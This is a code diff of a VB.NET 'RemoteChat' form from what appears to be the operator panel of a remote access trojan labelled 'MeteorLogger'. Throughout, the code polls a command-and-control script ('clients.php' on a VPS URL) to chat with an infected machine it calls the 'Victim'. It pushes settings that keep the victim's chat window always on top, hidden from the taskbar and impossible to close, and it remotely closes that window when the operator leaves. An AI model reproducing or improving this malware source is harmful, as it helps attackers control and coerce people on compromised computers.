@@ -5,39 +5,71 @@ Imports System.Text
 
 Public Class RemoteChat
     Public targetIp As String = ""
-    Public sessionId As String = ""
-    Dim chatFluxThread As New Threading.Thread(Sub() chatFluxManage())
+    Private chatFluxThread As New Threading.Thread(Sub() chatFluxManage())
+    Dim messageList As New List(Of Tuple(Of String, Boolean)) ' Respectively : message and isAdmin
+    Dim firstIter As Boolean = True
+    Dim sendMessageAllowed As Boolean = True
 
     Private Sub remotechat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Remote Chat @ " & targetIp
         chatFluxThread.Start()
     End Sub
 
-    Private Sub RemoteChat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
+    Private Sub RemoteChat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
+        Dim client As New WebClient()
         chatFluxThread.Abort()
-        'Todo: close window victim side
+        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=closeremotechat")
     End Sub
 
     Private Sub messageTB_TextChanged(sender As Object, e As EventArgs) Handles messageTB.TextChanged
         sendButton.Enabled = messageTB.Text.Trim <> ""
     End Sub
 
-    Private Sub addChatMessage(message As String, Optional isAdmin As Boolean = False)
-        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("
+    Private Sub RefreshChat()
+        Try
+            chatWindow.Clear()
 
-        If isAdmin Then
-            chatWindow.SelectionColor = Color.Blue : chatWindow.SelectedText = "You"
-        Else
-            chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "Victim"
-        End If
+            For Each message In messageList
+                chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("
 
-        chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message & vbCrLf
+                If message.Item2 Then ' isAdmin
+                    chatWindow.SelectionColor = Color.Red : chatWindow.SelectedText = "You"
+                Else
+                    chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "Victim"
+                End If
 
-        chatWindow.ScrollToCaret()
-        chatWindow.Refresh()
+                chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message.Item1 & vbCrLf
+            Next
+
+            If messageList.Count > 100 Then messageList.Clear()
+            chatWindow.ScrollToCaret() : chatWindow.Refresh()
+        Catch ex As AccessViolationException
+            MsgBox("Memory exception occured. Click OK to reload the tchat panel-side.",
+                MsgBoxStyle.Exclamation, "MeteorLogger - Remote chat @" & targetIp)
+            RefreshChat()
+        End Try
     End Sub
 
-    Private Sub sendButtonClickSub()
+    Private Sub DisplayVictimLeave()
+        For i = 0 To 4
+            chatWindow.Text &= Space(16) & "|" & Space(16) & vbCrLf
+        Next
+
+        chatWindow.Text &= "--- Victim has closed the chat window ---"
+        chatWindow.SelectionStart = chatWindow.Text.Length : chatWindow.ScrollToCaret() : chatWindow.Refresh()
+        messageTB.Enabled = False
+    End Sub
+
+    Private Sub StartCooldown(interval As Integer)
+        sendMessageAllowed = False
+        Threading.Thread.Sleep(interval)
+        Invoke(Sub() messageTB.Clear())
+        sendMessageAllowed = True
+    End Sub
+
+    Private Sub SendButtonClickSub()
+        If messageTB.Text.Trim.Length = 0 Or Not sendMessageAllowed Then Exit Sub
+
         Dim showInTaskBar = "0", alwaysOnTop = "1", allowCloseChat = "0"
 
         If allowCloseChatCB.Checked Then allowCloseChat = "1"
@@ -45,46 +77,64 @@ Public Class RemoteChat
         If topMostCB.Checked Then alwaysOnTop = "1"
 
         Dim sendMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
-                             "clients.php?action=adminsend&target=" & targetIp &
-                             "&actioncontent=" & showInTaskBar &
-                             "&actioncontent2=" & alwaysOnTop &
-                             "&actioncontent3=" & allowCloseChat &
-                             "&actioncontent4=" & messageTB.Text)
+                            "clients.php?action=adminsend&target=" & targetIp &
+                            "&actioncontent=" & showInTaskBar &
+                            "&actioncontent2=" & alwaysOnTop &
+                            "&actioncontent3=" & allowCloseChat &
+                            "&actioncontent4=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))
 
-        addChatMessage(messageTB.Text, True)
+        messageList.Add(New Tuple(Of String, Boolean)(messageTB.Text, True))
+        RefreshChat()
         messageTB.Clear()
+
+        Dim cooldownThread As New Threading.Thread(Sub() StartCooldown(1000))
+        cooldownThread.Start()
     End Sub
 
     Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
-        sendButtonClickSub()
+        ' TODO : Make a cooldown
+        SendButtonClickSub()
     End Sub
 
-
-    Private Sub chatFluxManage()
+    Private Sub ChatFluxManage()
         Dim lastMessageReceived As String = ""
 
         While True
-            Dim receiveMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
+            Dim receivedMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                              "clients.php?action=adminreceive&target=" & targetIp)
 
-            If receiveMessageQuery = lastMessageReceived Then
+            If receivedMessageQuery = lastMessageReceived Then
                 GoTo EndOfTreatement
             Else
-                lastMessageReceived = receiveMessageQuery
+                lastMessageReceived = receivedMessageQuery
             End If
 
-            If receiveMessageQuery.Trim = "" Then
+            If receivedMessageQuery.Trim = "" Then
                 GoTo EndOfTreatement
             End If
 
-            Dim parsedMessage As String() = receiveMessageQuery.Split("|")
-            'MESSAGE BASE64|RANDOMSTRING
-            '   MsgBox("parsed: " & parsedMessage(0))
-            Dim decodedMsg As String = Encoding.UTF8.GetString(Convert.FromBase64String(parsedMessage(0)))
-            addChatMessage(decodedMsg)
+            Dim parsedMsg As String() = receivedMessageQuery.Split("|")
 
+            ' TODO : What to do when the client's form isn't closed properly ?
+            ' For example if you RAT shutdown it and the form_close event doesn't
+            ' trigger ?
+            If parsedMsg(0) = "close" And Not firstIter Then
+                displayVictimLeave()
+                Exit While
+            End If
+
+            If Not firstIter Then
+                Dim decodedMsg As String =
+                Encoding.UTF8.GetString(Convert.FromBase64String(parsedMsg(0)))
+
+
+                messageList.Add(New Tuple(Of String, Boolean)(decodedMsg, False))
+            End If
+
+            refreshChat()
 EndOfTreatement:
-            Threading.Thread.Sleep(200)
+            firstIter = False
+            Threading.Thread.Sleep(100)
         End While
     End Sub
 
@@ -95,13 +145,20 @@ EndOfTreatement:
         End If
     End Sub
 
-    Private Sub chatWindow_TextChanged(sender As Object, e As EventArgs) Handles chatWindow.TextChanged
+    Dim removeCooldownMsg As Boolean = False
+    Private Sub cooldownTimer_Tick(sender As Object, e As EventArgs) Handles cooldownTimer.Tick
+        If Not sendMessageAllowed Then
+            sendButton.Enabled = False
+            messageTB.ForeColor = Color.Gray
+            messageTB.Text = "Cooldown..."
+            messageTB.ReadOnly = True
+            removeCooldownMsg = True
 
-    End Sub
-
-    Private Sub RemoteChat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
-        Dim client As New Net.WebClient()
-        MsgBox("Now closing")
-        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=closeremotechat")
+        ElseIf removeCooldownMsg Then
+            removeCooldownMsg = False
+            messageTB.ReadOnly = False
+            messageTB.ForeColor = Color.Black
+            sendButton.Enabled = True
+        End If
     End Sub
 End Class
